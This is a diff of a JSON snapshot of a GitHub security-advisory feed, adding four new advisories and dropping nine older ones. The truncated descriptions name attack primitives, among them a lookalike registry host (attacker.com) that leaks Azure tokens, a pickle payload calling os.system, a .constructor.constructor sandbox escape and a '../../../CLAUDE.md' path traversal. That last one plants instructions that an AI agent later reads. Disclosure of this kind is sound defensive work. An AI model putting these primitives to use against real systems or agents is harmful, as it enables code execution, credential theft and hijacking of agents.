@@ -1,12 +1,48 @@
 {
   "feed": "github-advisories",
   "source": "https://api.github.com/advisories?type=reviewed&per_page=100&sort=published&direction=desc",
-  "fetched_at": "2026-11-05T13:34:58+00:00",
+  "fetched_at": "2026-11-06T03:44:58+00:00",
   "window_days": 3,
-  "window_start": "2026-11-03",
-  "window_end": "2026-11-05",
-  "count": 13,
+  "window_start": "2026-11-04",
+  "window_end": "2026-11-06",
+  "count": 7,
   "items": [
+    {
+      "cve": "CVE-2026-62300",
+      "ghsa": "GHSA-m5ph-mmg5-6w5h",
+      "title": "filecoin-pin: Unbounded DAG pinning can exhaust server resources",
+      "description": "## Summary\n\nThe IPFS Pinning Service API implementation accepts a caller-controlled CID through `POST /pins`, queues background processing, and then recursively fetches the full DAG with `helia.pins.add(cid)`. The route and background pinning path do not enforce a request rate limit, per-user quota, maximum DAG byte count, maximum block count, traversal timeout, or concurrent pinning limit.\n\nAn authenticated caller, or an unauthenticated caller when the server is started with `ALLOW_NO_AUTH=true`, can submit one or more pins whose CIDs resolve to very large DAGs. The server writes fetched blocks to CAR files under `carStoragePath` and can consume disk, network, CPU, and libp2p resources until the process or host becomes unavailable.\n\n## Details\n\n`POST /pins` validates only that the request body contains a syntactically valid CID string, then forwards it to the pin store:\n\n- `src/filecoin",
+      "severity": "medium",
+      "published": "2026-11-05T18:07:30+00:00",
+      "link": "https://github.com/advisories/GHSA-m5ph-mmg5-6w5h"
+    },
+    {
+      "cve": "CVE-2026-61536",
+      "ghsa": "GHSA-64vx-6h2c-rjh7",
+      "title": "Banks: Unsafe importlib.import_module of attacker-controlled Tool.import_path in CompletionExtension allows RCE",
+      "description": "## Summary\n\n  `banks` parses `Tool` JSON objects from the rendered body of `{% completion %}` blocks and later resolves their\n  `import_path` field through `importlib.import_module(...)` + `getattr(...)` to obtain the callable that handles a tool\n   call. There is no allowlist or sanitization on `import_path`, so any importable Python attribute (e.g. `os.system`,\n  `subprocess.getoutput`) can be selected. When the LLM emits a `tool_calls` entry whose `function.name` matches the\n  attacker-supplied tool name, the resolved callable is invoked with kwargs decoded from `tool_call.function.arguments`,\n   yielding arbitrary code execution in the banks-hosting process.\n\n  This is distinct from GHSA-gphh-9q3h-jgpp / CVE-2026-44209. That advisory was fixed in 2.4.2 by switching\n  `src/banks/env.py` from `Environment` to `SandboxedEnvironment`. The fix does not touch\n  `src/banks/extensions/comple",
+      "severity": "high",
+      "published": "2026-11-05T17:51:02+00:00",
+      "link": "https://github.com/advisories/GHSA-64vx-6h2c-rjh7"
+    },
+    {
+      "cve": "CVE-2026-105769",
+      "ghsa": "GHSA-5q7h-w9jf-cx97",
+      "title": "kaniko can send the build's Azure (Entra ID) access token to lookalike ACR registry hosts",
+      "description": "### Summary\n\nkaniko before v1.25.20 can send a Microsoft Entra ID (Azure AD) access token for Azure Resource Manager to a registry host an attacker controls. A Dockerfile that references an image on a lookalike host, such as `FROM x.azurecr.io.attacker.com/img`, is enough. The build needs no `RUN` instruction and never has to push.\n\nThe flaw is in the Azure Container Registry (ACR) credential helper, `github.com/chrismellard/docker-credential-acr-env`. kaniko links it into the executor and warmer (the built-in helper) and also builds it as the standalone `docker-credential-acr-env` binary. The helper decides whether a host is an ACR registry with an unanchored regex, so any hostname that contains `.azurecr.io` (or `.azurecr.cn`, `.azurecr.de`, `.azurecr.us`) passes. The upstream module is unmaintained and has no fixed release. The Go vulnerability database tracks the upstream flaw as [GO",
+      "severity": "critical",
+      "published": "2026-11-05T17:48:54+00:00",
+      "link": "https://github.com/advisories/GHSA-5q7h-w9jf-cx97"
+    },
+    {
+      "cve": "CVE-2026-12411",
+      "ghsa": "GHSA-hhf9-qw4v-72xp",
+      "title": "lxd allows Cross-guest volume hijack via DevLXD device patch",
+      "description": "### Summary\n\nA guest can mount another guest's custom storage volume over `/dev/lxd` and read or write its contents without owning it. The DevLXD storage API blocks access to volumes you don't own, but the instance device-update path that attaches a volume to a container without checks ownership. Any guest in a project with `security.devlxd.management.volumes` enabled can attach a volume belonging to a different guest by naming it in a device `PATCH`, giving one tenant full read and write access to another tenant's volume data.\n\n### Details\n\nVolumes created over DevLXD get `volatile.devlxd.owner` set to the calling identity. The storage handlers enforce it on `GET`/`PUT`/`DELETE` ([`isDevLXDVolumeOwner`, lxd/devlxd_storage.go:359](https://github.com/canonical/lxd/blob/d29ece6284a78e6c21d276be4e5fb6fef697c35e/lxd/devlxd_storage.go#L359)) and on volume-copy sources ([devlxd_storage.go:286]",
+      "severity": "high",
+      "published": "2026-11-05T17:40:59+00:00",
+      "link": "https://github.com/advisories/GHSA-hhf9-qw4v-72xp"
+    },
     {
       "cve": "CVE-2026-55098",
       "ghsa": "GHSA-93cm-2v4m-c56c",
@@ -33,96 +69,6 @@
       "severity": "medium",
       "published": "2026-11-04T16:14:34+00:00",
       "link": "https://github.com/advisories/GHSA-3cgg-c5pp-57h6"
-    },
-    {
-      "cve": "CVE-2026-115878",
-      "ghsa": "GHSA-gh9r-c94j-cmp5",
-      "title": "Stanza: RCE via pickle deserialization in the lemmatizer",
-      "description": "## TL;DR\n\nLoading an attacker-supplied lemma `.pt` runs arbitrary code as the loading user. Since 1.14.0 the lemmatizer stores `pos_dict` as a gzip-compressed pickle in the checkpoint's `dicts` field (a `bytes` value). `torch.load(weights_only=True)` treats `bytes` as a primitive and passes it through unexamined, so its allowlist never sees the inner stream. `Trainer.load` then feeds those bytes to an **unrestricted `pickle.loads`**: the only bare `pickle.loads` in the tree. Result: `weights_only=True` gives no protection here, and model loading executes code.\n\nConfirmed end-to-end against stanza 1.14.0 / PyTorch 2.13.0 / CPython 3.13.7: a crafted checkpoint whose payload `__reduce__` returns `(os.system, (cmd,))` ran the command at load time (marker file showed `uid=501(...)`, `executed_by=...`).\n\nA downstream user is vulnerable whenever they build a pipeline that loads a caller-supplie",
-      "severity": "high",
-      "published": "2026-11-03T20:29:16+00:00",
-      "link": "https://github.com/advisories/GHSA-gh9r-c94j-cmp5"
-    },
-    {
-      "cve": "CVE-2026-44267",
-      "ghsa": "GHSA-33r5-xmm8-v6x5",
-      "title": "Elo JavaScript emitter has sandbox escape to arbitrary Node.js / browser code execution via unfiltered `.constructor` member access",
-      "description": "### Summary\n\nAn unauthenticated attacker who controls a string passed to any Elo JavaScript-emission path — `defaultFormats.elo.parse()`, the `bin/elo` CLI, or the live browser playground at `elo-lang.org/try` — can execute arbitrary code in the host JavaScript runtime. A payload built from the `.constructor.constructor` chain compiles, without modification, to a live `Function` invocation in the emitted JavaScript, escaping any sandbox assumption around \"Elo is a safe data/DSL language.\"\n\n### Vulnerable sink and root cause\n\nThree interacting sites in `src/` produce the bug at commit `749af7b`:\n\n1. **`src/transform.ts:144–158`** — the `member_access` handler allows access on types `any`, `object`, or `array` without filtering the property name. This is the only place an integrator could have plugged a denylist.\n2. **`src/compilers/javascript.ts:210`** — the JS emitter writes `${objectExp",
-      "severity": "critical",
-      "published": "2026-11-03T17:53:42+00:00",
-      "link": "https://github.com/advisories/GHSA-33r5-xmm8-v6x5"
-    },
-    {
-      "cve": "CVE-2026-44266",
-      "ghsa": "GHSA-7w38-ggh5-v542",
-      "title": "Elo Ruby backend has Remote Code Execution via unescaped `#{...}` interpolation in emitted string literals and subtype-constraint labels",
-      "description": "### Summary\n\nElo's Ruby backend emits attacker-controlled text into Ruby double-quoted strings without escaping the `#` character. Because `#` begins Ruby's interpolation sequences — `#{expr}`, `#@ivar`, `#@@cvar`, `#$gvar` — and any expression wrapped in `#{...}` may use backticks for shell execution, an Elo program that contains a crafted string literal or a labelled subtype constraint compiles to Ruby that evaluates attacker-chosen Ruby, and through backticks runs attacker-chosen shell commands, at runtime.\n\nThe same Elo source compiled to JavaScript, Python, or SQL is benign, so the bug also breaks the cross-target portability guarantee the rest of the compiler honours.\n\n### Vulnerable sinks\n\nTwo sinks exist in `src/compilers/ruby.ts` at commit `749af7b`:\n\n1. **String-literal emitter — lines 180–184.**\n   The emitter escapes backslash, double quote, and control characters, but not `#",
-      "severity": "critical",
-      "published": "2026-11-03T17:51:30+00:00",
-      "link": "https://github.com/advisories/GHSA-7w38-ggh5-v542"
-    },
-    {
-      "cve": "CVE-2026-44265",
-      "ghsa": "GHSA-x9rp-7wh3-2rj5",
-      "title": "Elo backends have code injection via unvalidated emission of programmatic AST fields",
-      "description": "### Summary\n\nElo's programmatic AST API accepts arbitrary values in many node fields without runtime type or syntax validation. Each backend's emit stage interpolates those values straight into the generated source with no escape pass. An integrator that populates the AST from JSON-deserialised input, plugin output, or any other untyped source therefore exposes a code-injection primitive that flows through to the emitted JavaScript, Ruby, Python, or SQL.\n\nThe same pattern was previously addressed in **0.9.7 (2026-01-27)**, which patched the date/datetime/duration literal emitters via `JSON.stringify()` after a report by **naoyashiga**. This advisory generalises that fix to the remaining AST surface — at least 23 emission sites across six node-field categories and four backends.\n\n### Vulnerable sinks\n\nEach row is a category of sinks that share the same shape: TypeScript signature erased a",
-      "severity": "high",
-      "published": "2026-11-03T17:48:09+00:00",
-      "link": "https://github.com/advisories/GHSA-x9rp-7wh3-2rj5"
-    },
-    {
-      "cve": null,
-      "ghsa": "GHSA-p3jp-9v83-76w9",
-      "title": "Microsoft Security Advisory CVE-2026-111497 - .NET Brotli Decoder Out-of-bounds Write Vulnerability",
-      "description": "## Executive summary\n\nA buffer overflow vulnerability exists in the Brotli decompression library used by .NET. This vulnerability may allow an unauthenticated attacker to read or corrupt process memory. This could lead to information disclosure, denial of service, or elevation of privilege.\n\nASP.NET Core and HttpClient do not automatically decompress Brotli data in their default configurations. Applications are exposed when they enable Brotli decompression or explicitly use Brotli decompression APIs to process attacker-controlled data, as described below. .NET Framework is not affected.\n\n## Announcement\n\nAnnouncement for this issue can be found at https://github.com/dotnet/announcements/issues/494\n\n## CVSS Details\n\n- **Version:** 3.1\n- **Severity:** High\n- **Score:** 8.1\n- **Vector:** `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:U/RL:O/RC:C`\n- **Weakness:** CWE-787 (Out-of-bounds Writ",
-      "severity": "high",
-      "published": "2026-11-03T17:33:48+00:00",
-      "link": "https://github.com/advisories/GHSA-p3jp-9v83-76w9"
-    },
-    {
-      "cve": "CVE-2026-62331",
-      "ghsa": "GHSA-48v2-6jcm-fc99",
-      "title": "praktor: Path traversal in Telegram file uploads allows writing outside the agent workspace uploads/ directory (stored instruction injection)",
-      "description": "### Impact\n\nA remote Telegram user can write files to arbitrary paths inside an agent's persistent workspace volume (`praktor-wk-<workspace>`, mounted at `/workspace/agent`), escaping the documented `uploads/` directory.\n\nThe attacker controls the Telegram document filename, which was concatenated into the destination path without sanitization (`internal/telegram/bot.go`, at both upload sites) and resolved with `path.Join`, which collapses `../` sequences. A filename like `../../../CLAUDE.md` resolved to the root of the agent workspace volume, outside `uploads/`.\n\nBecause the agent workspace is the persistent working directory the Claude agent reads from and operates on across runs, writing outside `uploads/` lets an attacker plant or overwrite files the agent later consumes — e.g. `CLAUDE.md`, agent instruction/skill/hook files, or other config under `/workspace/agent`. This turns a fil",
-      "severity": "high",
-      "published": "2026-11-03T17:27:25+00:00",
-      "link": "https://github.com/advisories/GHSA-48v2-6jcm-fc99"
-    },
-    {
-      "cve": "CVE-2026-11800",
-      "ghsa": "GHSA-j97h-3f8r-mrjr",
-      "title": "Keycloak has authentication bypass via jwt algorithm confusion",
-      "description": "### Description\nA flaw was found in Keycloak. This JWT algorithm confusion vulnerability in the JWT Authorization Grant flow allows an attacker with valid client credentials to bypass signature verification. By forging an assertion, the attacker can create unauthorized access tokens. This enables the attacker to impersonate any federated user linked to the affected Identity Provider, leading to unauthorized access and potential privilege escalation.",
-      "severity": "high",
-      "published": "2026-11-03T17:24:27+00:00",
-      "link": "https://github.com/advisories/GHSA-j97h-3f8r-mrjr"
-    },
-    {
-      "cve": null,
-      "ghsa": "GHSA-9ppr-wfw9-xvr2",
-      "title": "Netfoil doesn't decrement TTL",
-      "description": "### Summary\nTTL was not decremented, so stale records would continue to be served.",
-      "severity": "medium",
-      "published": "2026-11-03T16:48:29+00:00",
-      "link": "https://github.com/advisories/GHSA-9ppr-wfw9-xvr2"
-    },
-    {
-      "cve": "CVE-2026-62848",
-      "ghsa": "GHSA-h26j-4vp7-x9w2",
-      "title": "Metalama: Unsafe deserialization over Metalama's Visual Studio inter-process named pipe enables local code execution",
-      "description": "## Summary\n\nMetalama uses a local named-pipe channel to communicate between its Visual Studio processes — the Visual Studio UI process (`devenv`), the out-of-process Roslyn code-analysis process, and the CodeLens process. This channel deserialized messages from the pipe **without restricting which CLR types could be instantiated**. A local process able to write to the pipe can send a crafted message that instantiates arbitrary .NET types — a deserialization primitive in the same class as `BinaryFormatter` (CWE-502), and a well-known gadget-chain code-execution vector.\n\nThe flaw is present, via two successive serializers, in **every Metalama release from the first public version (2023.0) up to and including 2026.1.18**, and is fixed in **2026.1.19**.\n\nThe pipe name is predictable: `Metalama_{role}_{processId}_{hash(PackageVersion)}`, derived from the public package version and a locally-e",
-      "severity": "high",
-      "published": "2026-11-03T16:37:44+00:00",
-      "link": "https://github.com/advisories/GHSA-h26j-4vp7-x9w2"
-    },
-    {
-      "cve": null,
-      "ghsa": "GHSA-m3qr-fvp4-78xj",
-      "title": "Arc has unauthenticated application log disclosure via `/api/v1/logs`",
-      "description": "## Summary\n\nArc exposes `GET /api/v1/logs` without authentication even when authentication is enabled by default. The route is registered before the global Fiber authentication middleware, and the handler returns recent buffered application logs without performing its own authorization check.\n\n## Details\n\nArc applies the global auth middleware after calling `server.RegisterRoutes()`:\n\n- `cmd/arc/main.go:1598-1599` registers base routes via `server.RegisterRoutes()`.\n- `cmd/arc/main.go:1601-1618` configures and installs `auth.NewMiddleware(...)` later.\n\n`server.RegisterRoutes()` registers `GET /api/v1/logs` as a base route:\n\n- `internal/api/server.go:164-183` registers base health, metrics, and logs routes, including `s.app.Get(\"/api/v1/logs\", s.logsHandler)`.\n\nThe logs handler returns buffered logs without checking authentication or authorization:\n\n- `internal/api/server.go:537-567` pars",
-      "severity": "low",
-      "published": "2026-11-03T16:29:38+00:00",
-      "link": "https://github.com/advisories/GHSA-m3qr-fvp4-78xj"
     }
   ]
 }
